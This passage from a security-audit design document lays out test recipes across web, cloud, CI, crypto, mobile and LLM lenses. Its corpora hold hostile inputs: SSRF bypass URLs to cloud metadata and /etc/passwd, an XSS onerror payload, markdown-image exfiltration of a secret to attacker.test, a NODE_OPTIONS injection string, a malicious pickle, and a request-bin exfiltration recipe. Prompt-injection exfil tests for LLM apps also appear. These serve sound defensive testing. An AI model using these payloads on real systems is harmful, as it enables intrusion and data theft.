- **`llm-and-ai` â€” "Prompt caching / prompt-hash response cache as a cross-tenant side channel."** Kept out for volume: lower frequency than the six retained, and the timing-channel half is speculative in most apps. The durable rule is one clause in the checklist â€” grade the cache *key composition* (`(tenant_id, user_id, prompt_hash)`), not the existence of a cache.
- **`llm-and-ai` â€” "`trust_remote_code=True` / `torch.load` on a first-party digest-pinned artifact."** Cut for volume; the load-bearing fact belongs in the checklist item itself (PyTorch â‰¥ 2.6 defaults `torch.load` to `weights_only=True`), with escalation reserved for attacker influence over the artifact (`revision="main"` from a public hub, model path from user input, `weights_only=False` on old torch, a mutable bucket).
- **`cloud-and-iac` â€” "Pre-signed URL with long expiry / broad scope."** Split rather than kept: the durable finding (URL minted from a user-controlled object key with no ownership check) is `web-and-api`'s IDOR, and the STS-lifetime fact (an IMDS- or role-signed URL dies with the credentials, ~1 h to 12 h max, so a 7-day expiry is only real when signed with long-lived IAM *user* keys) is a downgrade rule for `## Severity calibration`.
- **`cloud-and-iac` â€” "`imagePullPolicy: IfNotPresent`."** Internal-consistency note, not an FP class: fold it into the digest-pinning checklist item, since `Always` earns its keep only for mutable tags on multi-tenant clusters.
- **`cloud-and-iac` â€” CIS hygiene items (`HEALTHCHECK` absent, no multi-stage build, default VPC, default NACLs, inline vs. managed policies).** This is a severity cap, not a false-positive rule â†’ `## Severity calibration`, Info/Low, never displacing a real finding in the ranked list. Carry two facts as footnotes there: Kubernetes ignores `HEALTHCHECK` entirely (kubelet uses probes), and the default VPC's real issue is `map_public_ip_on_launch`, not the VPC.
- **`cloud-and-iac` â€” "Replica without same encryption as primary."** Correct (AWS forbids an unencrypted replica or snapshot copy of an encrypted RDS/Aurora source; Cloud SQL and Azure SQL encrypt by default with no off switch) but the pattern is rare in repo-visible IaC. Redirect as a checklist item pointing at self-managed replication, logical dumps, and export targets.
- **`cloud-and-iac` â€” "`hostPath` mounts on node-agent DaemonSets."** Cut for volume: vendor DaemonSets (CNI, CSI, fluent-bit, node-exporter) usually are not in an application repo. Keep the discriminator in the checklist â€” a *workload* pod, a writable mount, or any escape path (`/`, `/etc/kubernetes`, `/var/lib/kubelet`, `/var/run/*.sock`, `/dev`) â€” and note that modern sockets are `containerd.sock`/`crio.sock`, not `docker.sock`.
- **`cicd-and-supply-chain` â€” "`curl â€¦ | sh`."** Cut for volume; when pinned, checksum-verified, and run in a digest-pinned ephemeral container it has the same trust structure as `actions/setup-*` or `apt-get`. The real discriminators (URL points at `latest`/`main`, no checksum or signature, secrets present in the environment during the fetch, no `set -o pipefail`) belong in the checklist line.
- **`cicd-and-supply-chain` â€” "Dependency lifecycle scripts allowed during install."** Rejected as written: the clause "not a finding when the install runs in an ephemeral container with no credentials and restricted egress" is not verifiable from a workflow file and would let a genuine malicious-postinstall path be waved away. Keep only the checkable half as a checklist note â€” `--ignore-scripts` breaks `prisma generate`, `sharp`, `esbuild`, `@swc/core`, `node-gyp`, Playwright/Puppeteer; pnpm â‰¥ 10 already blocks dependency scripts via `onlyBuiltDependencies`; check `.npmrc` for `ignore-scripts=true` before filing.
- **`cicd-and-supply-chain` â€” "`runs-on: self-hosted` in a public repo with ephemeral/JIT runners."** Severity downgrade (Critical â†’ Medium, framed as approval-policy and ephemerality drift) â†’ `## Severity calibration`. Critical stays for a persistent runner an arbitrary fork PR can reach, or one holding cloud credentials, a Docker socket, or a shared toolcache.
- **`cicd-and-supply-chain` â€” "Secrets passed via `env:`, and secret-looking identifiers in workflow files."** Split: the identifier half deduped â†’ `crypto-deep-dive` (5), and the strong half is a contradiction to fix in the lens's own text rather than an FP entry â€” `env:` is the prescribed injection mitigation, so it can never be cited as "secret exposure," and `${{ secrets.X }}` inline in `run:` is a masking/quoting nit. Keep the real leak list in the checklist: `echo`/`set -x` of a secret, base64/hex/JSON transforms that defeat masking, `env`/`printenv` dumps, uploading `.` as an artifact (sweeps up `.git/config`, `.npmrc`), caching `~/.npmrc` or `~/.docker/config.json`.
- **`cicd-and-supply-chain` â€” "No SBOM / no provenance" and "branch not deleted after merge."** Severity calibration, plus one deletion: for an internal-only service that ships no third-party artifact, missing SBOM/provenance is Low/informational. "Delete branch on merge" should be struck from the lens entirely â€” stale merged branches grant no access and are not executed, and deleting them can destroy investigation evidence.
- **`crypto-deep-dive` â€” "96-bit random nonce flagged as nonce-reuse risk."** Cut for volume; the bound (~2â»Â³Â² collision probability at 2Â³Â² messages under one key) is a calibration fact. The escalation triggers stay in the checklist: a key plausibly encrypting near 2Â³Â² messages, a nonce generated once outside the per-message path, or a process that can fork or be restored from a snapshot after CSPRNG seeding.
- **`crypto-deep-dive` â€” "Deliberate HS256 JWTs reported as 'should use RS256'."** Dedup â†’ `web-and-api` (6), which owns JWT verification; `crypto-deep-dive` should carry `defers: {jwt-verification: web-and-api}`. The design point (pinned `algorithms=["HS256"]` with a 256-bit managed secret is valid; escalate on an unpinned or cross-class algorithm list, a low-entropy or password-derived secret, or a verify-only party holding the key) moves into that entry's escalation list.
- **`salesforce` â€” "Hardcoded 15/18-character Ids."** Severity calibration, not a false positive: Org and User Ids are not secrets (every user can read both), and hardcoded RecordType/Profile/Queue/Group Ids are a portability defect that breaks on sandbox refresh â€” Info or Low in a security report. The adjacent findings that *are* security findings are different objects: a hardcoded session Id, an OAuth consumer secret, a certificate, a `SFDX_AUTH_URL`.
- **`salesforce` â€” "`System.debug(...)` near record data."** Cut for volume; debug logs need an active trace flag, are readable only with debug-log/Setup access, and expire. Promote the higher-value sibling into the checklist instead: throwing a raw `Exception` rather than `AuraHandledException` out of an `@AuraEnabled` method returns the stack trace, the failing SOQL, and often field values to any caller's browser.
- **`hipaa-and-phi` â€” "No column- or field-level encryption of PHI â†’ Â§164.312(a)(2)(iv)."** Dedup â†’ `cloud-and-iac` (4), which owns storage-encryption defaults; the HIPAA lens should carry `defers: {storage-encryption: cloud-and-iac}` and check the storage layer, not the ORM. Escalation stays HIPAA-side in the checklist: storage encryption verifiably disabled, self-managed storage with none, or a threat model that explicitly includes the DB operator (an argument for envelope encryption, stated as such rather than as a bare citation).
- **`hipaa-and-phi` â€” "Long session / 8-hour token â†’ Â§164.312(a)(2)(iii) Automatic Logoff."** Rejected as written: "an equivalent control probably exists at the badge, OS, or VDI layer" is unverifiable from a repo and would let a genuine no-timeout finding be dismissed. Keep only the concrete, testable half as a checklist item â€” no inactivity termination at any layer, or a session cookie with no expiry and no server-side idle tracking, so an unattended shared workstation stays authenticated indefinitely â€” with the addressable-specification point as a one-line severity note.
- **`privacy-and-compliance` â€” "Opaque or sequential identifiers in URL paths under 'personal data in URLs'."** Dedup â†’ `hipaa-and-phi` (5), which owns the identifier-in-URL rule. `privacy-and-compliance` keeps only the ownership split in frontmatter: `pii-in-urls` covers directly identifying or sensitive values (email, name, national ID, DOB, diagnosis or plan code, a bearer/reset/invite token, a personal-data search query), while sequential-ID access control defers to `web-and-api` â€” the two must never be double-reported on one route.
- **`privacy-and-compliance` â€” "IP address or city/region geolocation treated as sensitive personal information."** Cut for volume; the fact is right (CCPA SPI turns on *precise* geolocation defined by an ~1,850-foot radius, so IP-derived city/region does not trigger the "Limit the Use" machinery, and the SPI limitation right has purpose-based exceptions) but it belongs in the checklist beside the reminder that IP is still personal data under GDPR at a different finding and severity.
- **`privacy-and-compliance` â€” "No self-service SAR or export endpoint."** Severity calibration: Arts 15 and 20 are outcome obligations, so a documented runbook with an owner and evidence of meeting the one-month / 45-day deadline is compliant â†’ Low or Info. It becomes a real finding when fulfilment is impossible or unverifiable (no data map, personal data in stores nobody can enumerate, no record of requests and response dates, an export that silently omits the search index, warehouse, or processors).
- **`threat-modeling` â€” "No authentication between microservices" / "Spoofing: service A can be impersonated."** Dedup â†’ `web-and-api` (4): same rule (enforcement terminated outside the reviewed file), different layer. Per this lens's own guidance the correct output when the mesh, ingress, and deployment manifests are out of scope is an explicit assumption at Info, not a Spoofing finding with a severity.
- **`threat-modeling` â€” "Tenant A can reach tenant B's data," inferred from a query with no visible tenant predicate.** Dedup â†’ `web-and-api` (3), which owns IDOR/BOLA and multi-tenant scoping (Postgres RLS, per-tenant schema or database, a pooled `SET app.current_tenant`, an ORM global scope, per-tenant credentials). `threat-modeling` should state it as a scope assumption instead of asserting cross-tenant access.

## 5. Proof recipes worth shipping

The ten reference files proposed 61 proof recipes. Regrouped by bug class they collapse to **14 recurring test shapes**; several were independently invented by three or more lenses (the two-subject authorization sweep by six, the canary sink sweep by five). Ship each shape once, in the owning lens's `## Proof recipes` block, and put the shared harness pieces (route-table enumerators, socket-layer destination recorder, canary fixture set, counting fake provider client) in a single `lenses/_harness.md` that lenses reference by name rather than re-describing.

**Tier rule applied throughout, stated once:** a recipe is **T1** when `pytest` / `npm test` / `go test` in the repo under audit executes it, including when the repo's own test runner boots an ephemeral dependency it already boots (sqlite, testcontainers Postgres, a Firebase emulator invoked by the existing test script). It is **T2** when the recipe requires the auditor to stand up infrastructure the repo does not already stand up in its test command â€” kind/k3d, LocalStack, verdaccio, mitmproxy, an Android emulator, a Playwright run against a booted dev server. T2 needs the user asked every time, which in practice means most repos will not get it.

**Second resolution, load-bearing for severity:** four lenses independently insisted that a static checker must ship with a deliberately vulnerable fixture ("a test that only passes on good input proves nothing about detection" â€” cloud-and-iac). Adopt that as the rule and treat the result as T1, not T0: *a static checker executed by the repo's test runner, asserting `detect(fixtures/vulnerable/X) == 1` and `detect(fixtures/clean/X) == 0`, is an executed repo-local failing test.* Without this, every cicd-and-supply-chain and cloud-and-iac finding caps at Medium after the hard rails strip the dynamic half, and the skill systematically under-rates its two most dangerous domains. This is also exactly what `fixtures/vulnerable/`, `fixtures/clean/` and `EXPECTED.md` already exist to support.

### 5.1 Two-subject authorization sweep (BOLA, cross-tenant, sharing, retrieval, tool identity)
Lenses: web-and-api (API1), threat-modeling (STRIDE-E), llm-and-ai (LLM08, LLM06), salesforce (sharing bypass, UI-is-not-the-boundary), mobile (client-authoritative state), hipaa-and-phi (minimum necessary).
**Shape:** build `orgA{user_a, resource_a}` / `orgB{user_b}` once, seed `resource_a` with a distinctive marker string, then request A's id as B and assert *both* `status in (403, 404)` **and** the marker absent from body, headers, and any generated file. Add the client-supplied-identity variant (`{"tenant_id": 1}` as a tenant-2 user; `{userId: <victim>}` in a mobile request body) and the no-tenant-header variant that catches "no tenant" resolving to "all tenants".
**Fails on:** `repo.findById(id)`, `Resource.objects.get(pk=id)`, an unfiltered vector query, Apex `without sharing`. **Passes on:** an ownership-scoped query, a session-derived filter applied *inside* the vector query, `with sharing` / `WITH USER_MODE`.
**Tier:** T1. Two sharpenings are worth quoting verbatim into the lenses: llm-and-ai's "assert on the *prompt* sent to the provider, not the answer â€” a model that politely declines still received the foreign tenant's text"; and salesforce's `Assert.isFalse(result[0].isSet('SSN__c'))`, which distinguishes `stripInaccessible` from the cosmetic `record.SSN__c = null`.
**Caveat:** the Salesforce half is Apex, which only executes in an org. See the rails section.

### 5.2 Registry-driven enumeration (the harness that makes 5.1, 5.3 and 5.14 complete)
Lenses: web-and-api Ã—2, threat-modeling Ã—2, hipaa-and-phi Ã—2, privacy-and-compliance, llm-and-ai.
**Shape:** never hand-write cases. Enumerate from the framework's own registry â€” `app.routes`, `app.url_map.iter_rules()`, `Rails.application.routes.routes`, `app._router.stack`, `RequestMappingHandlerMapping.getHandlerMethods()`, the queue-consumer map, the tool registry, the live DB schema â€” and parametrize the hostile case over every member, with an explicit committed allowlist (`PUBLIC_ROUTES`, `PERSONAL_DATA_STORES`, `baa_approved_hosts.yml`) for exemptions.
**Fails on:** the day someone adds an unguarded route, an unregistered PHI column, a new personal-data table, or a tool parameter matching `^(user_id|tenant_id|org_id|role|is_admin|actor|on_behalf_of)$`. **Passes on:** guard present or a reviewable diff to the allowlist.
**Tier:** T1. Two details that must survive into the lens text: allowlist entries are anchored patterns, never `startswith` (with a self-test that `/publications/secret` is not matched by a `/public` entry), and the discovered route count is asserted against a checked-in number so the enumerator silently returning zero rows cannot pass.

### 5.3 Canary sweep of every output sink
Lenses: hipaa-and-phi (ePHI to logs/telemetry), privacy-and-compliance (PII/PAN in logs), mobile (secret in shipped bundle), cloud-and-iac (image layers, tf state, pod env), cicd-and-supply-chain (job logs, artifacts, caches).
**Shape:** populate every sensitive field with an unmistakable canary (`MRN-CANARY-8675309`, `SENTINEL-TOKEN-<uuid>`, `canary+pii@example.test`), attach a *capturing* handler to the real logger â€” not a mock, so formatters and serializers run â€” stub the vendor's **transport** rather than its API (`sentry_sdk` `transport.capture_envelope`), exercise the happy path *and* a forced exception inside the handler, then grep every sink for the canary and its derived encodings: base64, base64url, hex, URL-encoded, JSON-escaped, gzip+base64, reversed.
**Fails on:** whichever field the denylist forgot, `set -x`, `env` dumps, `COPY .env`, `upload-artifact path: .` (which sweeps `.git/config` with the persisted token). **Passes on:** an allowlist-based scrubber, BuildKit `RUN --mount=type=secret`, `persist-credentials: false`, explicit artifact paths.
**Tier:** T1 for logger capture, the React Native bundle/APK string sweep, `docker save` + layer grep, and `terraform show -json | grep`. T2/rails-blocked for the CI-provider log download â€” see below.
**Ship the regression multiplier:** hipaa's parametrization over `PatientModel.__fields__` so a new PHI column fails the test until it is registered with the scrubber. That single trick converts a denylist into an enforced allowlist and is the highest-value line in the whole proofs corpus.

### 5.4 Destination-set assertion at the socket/resolver layer
Lenses: web-and-api (SSRF), llm-and-ai (LLM01 exfil, model-driven SSRF), hipaa-and-phi (BAA egress), privacy-and-compliance (pre-consent trackers, GPC), cloud-and-iac (IMDS).
**Shape:** install the guard *first* so any unexpected connection fails loudly instead of silently reaching the internet â€” `pytest-socket` with `socket_allow_hosts`, monkeypatched `socket.getaddrinfo`/`create_connection`, `nock.disableNetConnect()`. Record the destination set and assert it is a subset of the allowlist. Then parametrize the bypass corpus: `http://127.0.0.1:8080/`, `http://[::1]/`, `http://2130706433/`, `http://0177.0.0.1/`, `http://[::ffff:127.0.0.1]/`, `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, `http://metadata.google.internal/computeMetadata/v1/`, `http://allowed.example@evil.example/`, `http://evil.example#@allowed.example/`, `http://allowed.example.evil.example/`, `file:///etc/passwd`, `gopher://â€¦`.
**Fails on:** `requests.get(user_url)` behind a hostname regex. **Passes on:** a pinned-IP dialer or egress proxy.
**Tier:** T1. The two cases that separate a real fix from a regex are web-and-api's redirect chase (302 â†’ `169.254.169.254`, assert not followed) and **DNS rebinding** (stub the resolver to answer public on lookup 1 and `127.0.0.1` on lookup 2). Rebinding is the load-bearing assertion: it passes only if the code connects to the IP it validated. Keep it.

### 5.5 Forged-and-mutated token table
Lenses: web-and-api (JWT), crypto-deep-dive (JWT/alg confusion), threat-modeling (capability URLs), mobile (deep links).
**Shape:** forge tokens by hand (base64url header/payload + your own MAC) rather than with the library's `sign`, so you can produce tokens the library refuses to create. Rows: `{"alg":"none"}` with empty signature; HS256 keyed on the **exact PEM bytes** of the server's RSA public key (plus DER and newline-stripped variants); right `alg`, wrong key; `kid`/`jku`/`x5u` pointing outward with sockets blocked and the HTTP client spied on; RS256â†’PS256/ES256; expired `exp`, future `nbf`; wrong `aud`/`iss`. Assert on the *authorization decision*, never a log line. Finish with one positive case, otherwise a verifier that rejects everything passes. Same shape for share links: flip the role claim, extend expiry, swap the document id, drop the signature segment, truncate, and append a duplicate parameter (`?perm=view&perm=edit`) to probe parser differentials.
**Fails on:** `jwt.decode(token, key)` with no `algorithms=`/`audience=`/`issuer=`. **Passes on:** `algorithms=["RS256"]` plus an allowlisted JWKS source.
**Tier:** T1. Pair with threat-modeling's entropy test (10k tokens, frozen clock, assert distinct, â‰¥128 bits over the actual alphabet, no timestamp-correlated prefix) to kill `Math.random`/`uuid1` grants.

### 5.6 Signed-request replay and timestamp boundary
Lenses: crypto-deep-dive (CWE-294), web-and-api (A08).
**Shape:** capture one genuinely valid signed request from the happy path, then six rows, each asserting **status and side effect**: (1) valid â†’ 200 and exactly one row/mock call; (2) body differing only in whitespace or key order with the original signature â†’ 401, proving raw-bytes verification rather than `json.dumps(request.json)`; (3) one byte flipped â†’ 401 and `mock.assert_not_called()`; (4) `timestamp = now - window - 1s` â†’ reject, `now - window + 1s` â†’ accept, which pins the boundary instead of guessing it; (5) timestamp header deleted â†’ reject; `now + 24h` â†’ reject; (6) delivered twice â†’ the second is a no-op (one row, not two).
**Fails on:** a handler that 401s the replay *after* the write, or verifies the re-serialized body. **Passes on:** raw-body HMAC plus an idempotency key or replay cache.
**Tier:** T1. Both lenses independently say: do not ship a wall-clock timing benchmark as the gate. Assert the constant-time API is used instead (spy on `hmac.compare_digest` / `crypto.timingSafeEqual` and assert `==` never touches the signature variable).

### 5.7 Injection into a secondary interpreter
Lenses: salesforce (SOQL), cicd-and-supply-chain (workflow expressions), mobile (deep-link URL parser).
**Shape:** insert two distinguishable records, call with an exact match and assert size 1, then call with a tautology (`"Alpha' OR Name != '"`) and assert the size is *still* 1 â€” size 2 is the proof. Add the `LIKE` case (`'%'`) showing `escapeSingleQuotes` does not escape `%`/`_`, and a non-quoted context (`ORDER BY`, field name) to show the fix there must be an allowlist. For workflows: parse `.github/workflows/*.y*ml` with ruamel.yaml, extract `\$\{\{\s*([^}]+?)\s*\}\}` from `run:`, `with.script`, and all `with:` values, and assert every context path is in `SAFE_CONTEXTS`. For deep links: refactor to a pure `resolveDeepLink(url): Route | null` and table-drive `javascript:`, `file://`, `//evil.tld`, `https://trusted.tld.evil.tld`, `https://trusted.tld@evil.tld`, `%6a%61%76%61â€¦`, homoglyph hosts.
**Fails/passes:** vulnerable returns 2 rows / executes / returns the URL unchanged; patched binds parameters, moves the value into `env:` and references `"$HEAD_REF"`, or returns `null`.
**Tier:** T1 for the SOQL logic (in an org â€” see rails), the workflow parser as a detector+fixture pair, and the pure-function deep-link table. T2 for the `adb shell am start` / `xcrun simctl openurl` wiring shot.

### 5.8 Sentinel-file execution proof
Lenses: llm-and-ai (LLM03 malicious model artifact), cicd-and-supply-chain (`$GITHUB_ENV` smuggling, postinstall canary).
**Shape:** build the hostile fixture locally â€” a pickle whose `__reduce__` writes a sentinel, a fake hub dir whose `modeling_custom.py` writes a second sentinel, a package whose `postinstall` touches `/tmp/ran`, an issue title containing a real newline plus `NODE_OPTIONS=--require /tmp/p.js`. Assert **both** that the loader raised **and** that the sentinel file does not exist. The file check is the whole point: an exception can be raised *after* the payload runs.
**Passes on:** `weights_only=True` / `safetensors.torch.load_file`, `trust_remote_code=False`, pinned `revision=<sha>`, `--ignore-scripts`, and the random heredoc delimiter form `D=$(openssl rand -hex 16); printf 'TITLE<<%s\n%s\n%s\n' "$D" "$VAL" "$D" >> "$GITHUB_ENV"`.
**Tier:** T1 for the model-artifact half. The `$GITHUB_ENV` half needs a workflow runner; ship it as a static companion assertion â€” *no line appending to `$GITHUB_ENV`/`$GITHUB_OUTPUT`/`$GITHUB_PATH` may contain `${{` unless it is the delimiter form* â€” because cicd correctly notes the vulnerable line looks exactly like the recommended fix and the `${{`-in-`run:` checker misses it entirely.

### 5.9 Hostile-output render assertion
Lenses: salesforce (LWC `lwc:dom="manual"` + `innerHTML`), llm-and-ai (LLM05).
**Shape:** feed the render path a fixed hostile corpus â€” `![x](https://attacker.test/p?d=SECRET)`, `<img src=x onerror="window.__pwned=1">`, `[click](javascript:alert(1))`, `<iframe>`, a data-URI SVG â€” and assert no `img` element exists, the payload appears as text, `window.__pwned` is undefined, and no attacker-controlled `src`/`href` host survives. Assert the route's CSP constrains `img-src` and `connect-src` explicitly rather than leaning on `default-src`.
**Tier:** T1 via `@salesforce/sfdx-lwc-jest` or jsdom â€” the Salesforce Jest recipe is the one Salesforce test in the corpus that runs fully offline. **T2** for llm-and-ai's end-to-end half (headless UI + bound localhost listener asserting zero requests), which is the only version that proves the *channel* is closed rather than that one string was escaped.

### 5.10 Crypto behaviour harvest and call-order spies
Lens: crypto-deep-dive (all six recipes; nothing else overlaps).
**Shape:** harvest rather than reason. 2000 encryptions with one key handle â†’ `len(set(nonces)) == N`, repeated after module re-import, from 16 threads, from 16 processes, and across `os.fork()`; on collision assert `C1 ^ C2 != P1 ^ P2` and print the recovered plaintext. Comparison safety via a tripwire operand (`class Tripwire(bytes): def __eq__(self, other): raise AssertionError('non-constant-time compare')`). KDF parameters asserted on the **stored artifact** read back out of the DB (`$argon2id$v=19$m>=19456,t>=2,p>=1`, `$2b$` cost â‰¥ 12, `pbkdf2_sha256` â‰¥ 600000, scrypt N â‰¥ 2^17), plus the bcrypt 72-byte truncation row and the NUL-truncation row that naive SHA-256 pre-hashing introduces. Ordering invariant recorded with a shared list: `assert calls.index('verify_mac') < calls.index('unpad')`, and with a bad tag assert the unpad/parse spies were **never called**.
**Tier:** T1 throughout. The statistical timing test stays marked `@pytest.mark.timing` and non-gating â€” flaky in CI and reviewers discount it.

### 5.11 Detector + fixture-pair policy tests over rendered config
Lenses: cloud-and-iac (plan-time S3 BPA, SG ports), cicd-and-supply-chain (action pins), mobile (merged manifest/plist), threat-modeling (architectural erosion).
**Shape:** assert against the *rendered* artifact, never the source â€” `terraform show -json plan.out`, the merged release manifest at `app/build/intermediates/merged_manifests/release/AndroidManifest.xml`, `plutil -convert json` of the built `Info.plist`, rendered K8s manifests, `conftest test bad.yaml good.yaml`. One vulnerable fixture and one clean fixture per rule so both branches are exercised. Pin the pin-set: `re.fullmatch(r'[^@]+@[0-9a-f]{40}', ref)` for every `uses:` plus equality against a committed `.github/action-pins.lock`, so a silent re-pin fails review instead of passing quietly. Encode design boundaries as executable invariants with import-linter / dependency-cruiser / ArchUnit / `go list -deps`, seeded with one violating import to prove the rule fires.
**Fails/passes:** the vulnerable fixture flags, the clean fixture does not, the repo tree is clean.
**Tier:** T1 under the resolution stated above. Rendering the artifact must not require a cloud call: `terraform plan` against a provider that needs credentials is not rails-legal, so lenses must accept a checked-in plan JSON fixture as the audited input when the live plan cannot be produced offline. Mobile's merged-manifest recipe needs a real Gradle release build (slow but local, T1); its iOS half needs macOS and is unavailable on most hosts.

### 5.12 Counting-spy caps on resources and cost
Lenses: web-and-api (API4), llm-and-ai (LLM10).
**Shape:** generate the payload programmatically so the test documents the threshold: `q = 'query{user{' + 'friends{'*30 + 'id' + '}'*30 + '}}'`, the same expensive field aliased 500 times, a batch of 100 operations. Assert a validation error **and that resolver spies recorded zero calls** â€” a server that executes then truncates is still vulnerable and only the spy distinguishes them. Same discipline for LLM: a counting fake client that always returns another tool call must stop at `max_iterations` with the recorded call count equal to the cap; a 5-million-character prompt must be rejected 413 with **zero provider calls recorded**. Rate limits: loop `MAX+1` and assert 429 with `Retry-After`, then loop again varying `X-Forwarded-For` per request and assert it *still* 429s.
**Tier:** T1. Reset the limiter store in a fixture so the suite stays order-independent.

### 5.13 Fail-open injection at a dependency boundary
Lenses: threat-modeling (primary owner), web-and-api (A08 fail-open shapes: `if sig and not verify(...)`, `except Exception: return 200`).
**Shape:** monkeypatch the dependency the boundary consults â€” policy service, token introspection, JWKS fetch, secret manager, webhook-secret lookup â€” to raise a timeout, then send a request that must be denied. Assert denial (403) or hard failure (5xx) **and** that the protected side effect did not occur. Repeat with malformed-but-successful output: empty body, `{}`, `null`, HTTP 200 with an HTML error page. "Deny on error" is usually implemented for exceptions only.
**Tier:** T1. Cheapest high-yield recipe in the corpus; every lens with an external authz dependency should reference it rather than restate it.

### 5.14 Clock-controlled, registry-driven deletion / retention / de-identification
Lenses: privacy-and-compliance (erasure, storage limitation, consent immutability), hipaa-and-phi (audit trail, Safe Harbor de-identification), threat-modeling (repudiation completeness).
**Shape:** seed canaries into every store in the registry, call the deletion API, invoke the purge job **explicitly** (never wait on cron), then assert zero residue per store *and* that each processor stub recorded a delete/suppress call *and* that the registry is exhaustive (fail if any table matching a personal-data classifier is absent from it). Retention: two rows per rule, one just inside and one just outside the window, advance a `freezegun`/`jest.setSystemTime` clock, assert the outside row is gone and the inside row is untouched â€” the second half is what stops an over-broad purge from passing. Legal hold: seed an Art 17(3) invoice and assert it survives but is flagged non-marketable, so the fix cannot be "delete everything." Append-only: attempt `UPDATE consents SET granted=false` and `DELETE FROM consents` and assert both raise; same for the audit table under the application role. De-identification: populate all 18 identifier categories with traceable canaries and assert element-by-element (ZIP truncated to three digits and not a restricted prefix, all dates but year suppressed, ages > 89 collapsed to `90+`), then assert the de-identified role has no grant on the crosswalk table.
**Fails/passes:** vulnerable pipelines mask names and SSN but pass DOB, five-digit ZIP and admission date through; a boolean `marketing_opt_in` column cannot satisfy the provenance assertion and the test fails as it should.
**Tier:** T1, with one honest caveat: the append-only and grant-based assertions require a real engine with the roles provisioned by the repo's own migrations. On sqlite, or in a repo whose migrations do not create the application role, that half is UNPROVEN and must be reported as such rather than quietly dropped.

### T2-only recipes â€” these will report UNPROVEN in most repositories
Flagged explicitly because the tier system caps them at Medium whenever the user declines the T2 run, and the user is asked every time:

- **cloud-and-iac has almost no T1 runtime story.** Unauthenticated S3 403 sweep (needs LocalStack), pod-escape and RBAC proofs (`kubectl apply --dry-run=server` against a PSA-labelled namespace, `kubectl auth can-i` matrix, `chroot /host id`, the ServiceAccount-token `curl` to `kubernetes.default`) all need a kind/k3d cluster. Only the plan-time JSON assertions and `conftest`/`kyverno apply` on fixture pairs are T1. Expect most cloud findings to rest on 5.11 alone.
- **mobile on-device work.** The unencrypted-storage sentinel sweep (`adb shell run-as <pkg> strings databases/RKStorage`, `xcrun simctl get_app_container`), the `adb`/`simctl` deep-link shot, and the mitmproxy user-CA integration test all need an emulator or simulator. The iOS half additionally needs macOS + Xcode and is simply unavailable on Windows/Linux hosts â€” say so in the lens rather than implying parity.
- **privacy-and-compliance browser tests.** Pre-consent tracking and the client-level GPC test need Playwright against a booted app. Both are the *primary* evidence for their bug classes; the server-level `Sec-GPC` and `/.well-known/gpc.json` assertions are T1 but only cover the header-only implementation, which is exactly the half-fix the lens is trying to catch.
- **llm-and-ai LLM05 end-to-end** listener assertion, and **cicd dependency confusion** (docker-compose verdaccio/pypiserver), which must additionally run with networking disabled so the real public registry cannot answer.
- **All Salesforce Apex recipes.** Apex tests execute only inside an org. That is a remote host, so under the hard rails the auditor writes the test and does not run it: every Apex recipe lands at T3 UNPROVEN capped at Medium unless the user explicitly runs `sf apex run test` themselves and pastes the result. The salesforce lens must say this in plain words, and its Jest/LWC recipe (5.9) should be foregrounded as the one proof that actually executes locally.

### Recipes that violate the hard rails â€” rewrite or drop before shipping
All six are in cicd-and-supply-chain or cloud-and-iac. As written they reach remote hosts, and two exfiltrate a sentinel to a third party.

1. **Pwn-request end-to-end (cicd).** Fork a repo on GitHub, open a PR, exfiltrate `secrets.CANARY` to "a request-bin URL you control." Remote host **and** outbound exfiltration. **Rewrite:** detector + fixture pair for `pull_request_target`/`workflow_run` that checks out a PR ref, plus the two-workflow patch pattern documented as the fix. If a dynamic run is wanted, it is a localhost `act` run with a localhost sink and a local canary file â€” never a hosted request bin. Never a real GitHub PR.
2. **Mutable-tag live demo (cicd).** Scratch GitHub org, `git tag -f v1 && git push -f --tags`, `gh api /orgs/$ORG/actions/permissions/selected-actions`. **Rewrite:** keep only the static 40-hex pin assertion plus `.github/action-pins.lock` equality. The tag-move narrative belongs in the lens prose as explanation, not as an executable step.
3. **Secret sentinel sweep via the CI provider (cicd).** `gh api /repos/$O/$R/actions/runs/$ID/logs`, `gh run download`. Remote. **Rewrite:** keep the derived-encoding grep â€” it is the most valuable part of the recipe â€” and point it at locally produced logs and a local artifact directory, plus the two structural assertions (no artifact path matches `**/.git/config`, `**/.npmrc`, `**/.docker/config.json`, `**/*.pem`, `.env`; no `actions/cache` path includes them), which are pure static T1.
4. **Provenance verification (cicd).** `gh attestation verify`, `cosign verify-attestation` (Fulcio + Rekor), and pushing a tampered artifact "into a staging namespace." Remote on both halves. **Rewrite:** offline tamper detection with a locally generated key pair and `cosign verify --key`; static assertion that every verify invocation carries `--certificate-identity-regexp` and `--certificate-oidc-issuer` (their absence is the subtle bug â€” `cosign verify` without them accepts anything Fulcio ever signed); and a static assertion that an enforcing admission policy (`verifyImages`, `npm audit signatures`, a release preflight) exists in the deploy path. The "emits provenance nobody checks" asymmetry is then reported from static evidence, which is honest.
5. **IAM policy checks via the AWS API (cloud).** `aws accessanalyzer check-access-not-granted`, `check-no-new-access`, `aws iam simulate-principal-policy`. These are network calls to AWS with real credentials; `simulate-principal-policy` additionally requires the role to be deployed. **Rewrite:** a local policy-document parser over the rendered plan, checked against a pinned escalation-action list (`iam:PassRole`, `iam:CreateAccessKey`, `iam:AttachRolePolicy`, `sts:AssumeRole`), as a detector + fixture pair. Recommend Access Analyzer to the user as a manual follow-up; do not run it inside the skill.
6. **Runtime reachability probes (cloud).** `curl https://$B.s3.amazonaws.com/canary.txt`, `timeout 5 bash -c "</dev/tcp/$DB_HOST/5432"` from "a runner outside the VPC", a "sandbox account in a nightly job", and the IMDS `curl http://169.254.169.254/...` from a launched instance. All remote hosts. **Drop the remote forms; keep the LocalStack variant (T2, localhost) and the plan-time assertion (T1).**

One additional rails defect, in an otherwise-clean recipe: privacy-and-compliance's pre-consent Playwright test registers `context.route('**', r => { seen.push(...); r.continue(); })`. `r.continue()` **actually sends** the tracker beacons â€” real egress to google-analytics.com, doubleclick.net and friends, carrying the page URL. Change it to record-then-`r.abort()` for every host outside the first-party allowlist. The test must not perform the tracking it is testing for.

### Bug classes with no viable proof recipe

No automated test is realistic for these. They will be reported UNPROVEN every run, and the skill's documentation â€” SKILL.md's proof-tier section and the Phase 5 Coverage block â€” should name them rather than let users infer that silence means safety.

- **BAA existence and vendor contract status** (hipaa-and-phi). The socket-hooked allowlist test proves *where data goes*; it cannot prove a signed BAA exists. The `last-verified` date in `baa_approved_hosts.yml` is a human claim the test can only check for staleness.
